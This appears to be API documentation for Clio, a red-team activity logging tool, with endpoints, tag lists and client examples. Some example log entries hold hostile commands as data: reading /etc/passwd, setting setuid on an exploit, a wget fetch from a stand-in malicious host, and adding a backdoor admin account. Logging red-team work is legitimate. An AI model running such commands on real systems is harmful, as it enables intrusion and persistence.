# API Documentation

Clio provides a REST API for programmatic log submission, allowing integration with external tools and automation of workflows. This guide covers API authentication, available endpoints, and usage examples.

## API Key Management

### Creating API Keys

API keys can only be created by administrators through the Clio web interface:

1. Log in as an administrator
2. Navigate to the "API Keys" section
3. Click "Create API Key"
4. Configure the key:
   - **Name**: A descriptive name for the key
   - **Description**: (Optional) Information about key usage
   - **Permissions**: Select appropriate permissions
   - **Expiration**: (Optional) Set an expiration date

The generated API key will be displayed only once. Make sure to copy and store it securely.

### API Key Format

API keys follow this format:
```
rtl_keyId_secretPart
```

- `rtl_` is the prefix identifying a Clio API key
- `keyId` is a unique identifier for the key (used for tracking and revocation)
- `secretPart` is the secure part of the key (never stored in plain text)

### API Key Permissions

Each API key can have one or more of the following permissions:

- **logs:write**: Submit new logs via API
- **logs:read**: Read existing logs via API (reserved for future use)
- **logs:admin**: Full admin privileges via API (reserved for future use)

## Authentication

All API requests must include the API key in the `X-API-Key` header:

```
X-API-Key: rtl_yourkey_abc123
```

## API Endpoints

### Status Check

Verify that your API key is working correctly:

```
GET /api/ingest/status
```

**Example Response:**
```json
{
  "status": "ok",
  "apiKey": {
    "name": "Integration Key",
    "keyId": "a1b2c3d4",
    "permissions": ["logs:write"]
  },
  "timestamp": "2025-03-06T14:30:45.123Z"
}
```

### Log Submission

Submit one or more logs:

```
POST /api/ingest/logs
```

**Request Format (Single Log):**
```json
{
  "internal_ip": "192.168.1.100",
  "external_ip": "203.0.113.1",
  "hostname": "victim-host",
  "domain": "example.org",
  "username": "jsmith",
  "command": "cat /etc/passwd",
  "notes": "Privilege escalation attempt",
  "filename": "passwd",
  "status": "ON_DISK",
  "tags": ["reconnaissance", "linux", "sensitive"]
}
```

**Request Format (Multiple Logs):**
```json
[
  {
    "internal_ip": "192.168.1.100",
    "hostname": "host-1",
    "command": "chmod +s /tmp/exploit",
    "tags": ["privilege-escalation", "persistence"]
  },
  {
    "external_ip": "198.51.100.1",
    "hostname": "host-2",
    "domain": "example.org",
    "command": "wget http://malicious.com/payload",
    "tags": ["execution", "cobalt-strike"]
  }
]
```

**Response Format:**
```json
{
  "message": "Processed 2 logs: 2 successful, 0 failed",
  "results": [
    {
      "id": 1234,
      "success": true,
      "tags": ["privilege-escalation", "persistence", "OP:RedTeam2025"]
    },
    {
      "id": 1235,
      "success": true,
      "tags": ["execution", "cobalt-strike", "OP:RedTeam2025"]
    }
  ]
}
```

**Note on Tags:**
- Tags can be included as an array of tag names in the log submission
- The system will automatically add the operation tag if the API key is associated with a user who has an active operation
- If a tag doesn't exist, it will be created automatically (for non-admin API keys, only certain tag categories may be created)

## Field Descriptions

| Field | Description | Max Length | Required |
|-------|-------------|------------|----------|
| internal_ip | Internal IP address of the target system | 45 | No |
| external_ip | External/public IP address | 45 | No |
| hostname | System hostname | 75 | No |
| domain | Associated domain | 75 | No |
| username | User account name | 75 | No |
| command | Command executed on the system | 150 | No |
| notes | Additional context or observations | 254 | No |
| filename | Name of relevant files | 100 | No |
| status | File status (ON_DISK, IN_MEMORY, etc.) | 20 | No |
| tags | Array of tag names to apply to the log | - | No |

## Valid Status Values

- `ON_DISK` - File is present on the target system
- `IN_MEMORY` - File exists only in memory
- `ENCRYPTED` - File is encrypted on disk
- `REMOVED` - File has been deleted
- `CLEANED` - File and traces have been removed
- `DORMANT` - File is inactive but present
- `DETECTED` - File has been detected by security tools
- `UNKNOWN` - Status is unknown or unverified

## Available Tags

The system includes pre-defined tags in several categories:

### MITRE ATT&CK Technique Tags
- `reconnaissance`, `initial-access`, `execution`, `persistence`
- `privilege-escalation`, `defense-evasion`, `credential-access`
- `discovery`, `lateral-movement`, `collection`
- `command-control`, `exfiltration`, `impact`

### Tool Tags
- `mimikatz`, `cobalt-strike`, `metasploit`, `empire`
- `bloodhound`, `rubeus`, `sharphound`, `powerview`
- `nmap`, `burpsuite`, `sqlmap`

### Workflow Tags
- `in-progress`, `needs-review`, `completed`
- `verified`, `documented`, `reported`

### Evidence Tags
- `screenshot`, `packet-capture`, `memory-dump`, `log-file`

### Security Classification Tags
- `sensitive`, `pii`, `classified`

### Operation Tags
- Automatically created with prefix `OP:` when operations are created
- Example: `OP:RedTeam2025`, `OP:PenTest-ClientName`

## Example: Python Script

```python
import requests
import json

# Configuration
API_KEY = "rtl_yourkey_abc123"
CLIO_URL = "https://your-clio-server"

# Headers
headers = {
    "X-API-Key": API_KEY,
    "Content-Type": "application/json"
}

# Submit a single log with tags
log_data = {
    "internal_ip": "192.168.1.100",
    "hostname": "dc01",
    "domain": "corp.example.com",
    "username": "administrator",
    "command": "net user backdoor P@ssw0rd123 /add",
    "notes": "Created backdoor account",
    "status": "ON_DISK",
    "tags": ["persistence", "credential-access", "verified"]
}

response = requests.post(
    f"{CLIO_URL}/api/ingest/logs",
    headers=headers,
    json=log_data
)

if response.status_code == 200:
    print("Log submitted successfully")
    print(json.dumps(response.json(), indent=2))
else:
    print(f"Error: {response.status_code}")
    print(response.text)
```

## Example: Bash/cURL

```bash
#!/bin/bash

API_KEY="rtl_yourkey_abc123"
CLIO_URL="https://your-clio-server"

# Submit a log with tags
curl -X POST "${CLIO_URL}/api/ingest/logs" \
  -H "X-API-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "internal_ip": "10.10.10.5",
    "hostname": "web-server",
    "command": "whoami",
    "notes": "Initial access achieved",
    "status": "IN_MEMORY",
    "tags": ["initial-access", "web-exploit"]
  }'
```

## Example: PowerShell

```powershell
$apiKey = "rtl_yourkey_abc123"
$clioUrl = "https://your-clio-server"

$headers = @{
    "X-API-Key" = $apiKey
    "Content-Type" = "application/json"
}

$logData = @{
    internal_ip = "172.16.0.10"
    hostname = "file-server"
    command = "Get-LocalUser"
    notes = "Enumeration phase"
    status = "IN_MEMORY"
    tags = @("discovery", "powershell")
} | ConvertTo-Json

$response = Invoke-RestMethod `
    -Uri "$clioUrl/api/ingest/logs" `
    -Method Post `
    -Headers $headers `
    -Body $logData

Write-Host "Log submitted successfully:"
$response | ConvertTo-Json
```

## Rate Limiting

API endpoints are rate-limited to prevent abuse:
- **Per API Key**: 1000 requests per minute
- **Per IP**: 100 requests per minute for unauthenticated endpoints

If you exceed these limits, you'll receive a `429 Too Many Requests` response.

## Error Responses

Common error responses and their meanings:

| Status Code | Meaning | Action |
|-------------|---------|--------|
| 400 | Bad Request | Check your request format and required fields |
| 401 | Unauthorized | Verify your API key is correct and active |
| 403 | Forbidden | API key lacks required permissions |
| 404 | Not Found | Check the endpoint URL |
| 429 | Too Many Requests | You've hit rate limits, wait before retrying |
| 500 | Internal Server Error | Server issue, contact administrator if persists |

## Best Practices

1. **Batch Submissions**: Send multiple logs in a single request when possible
2. **Error Handling**: Implement retry logic with exponential backoff
3. **Tag Consistently**: Use standardized tags across your tools for better analysis
4. **Include Context**: Add meaningful notes to help with later analysis
5. **Validate Data**: Ensure IP addresses and other fields are properly formatted
6. **Use HTTPS**: Always use HTTPS in production environments
7. **Secure Storage**: Never commit API keys to version control
8. **Monitor Usage**: Track your API usage to avoid rate limits
9. **Operation Tags**: Coordinate with your team on operation naming conventions

## Integration with C2 Frameworks

Clio includes log forwarders for popular C2 frameworks that automatically use the API:

- **Cobalt Strike**: See [Cobalt Strike Integration](../log_exporter/docs/COBALT_STRIKE.md)
- **Sliver**: See [Sliver Integration](../log_exporter/docs/SLIVER.md)

These forwarders handle authentication, batching, and error recovery automatically.

## Support

For API-related issues:
1. Check API key permissions and expiration
2. Verify request format matches documentation
3. Review server logs for detailed error messages
4. Contact your system administrator for assistance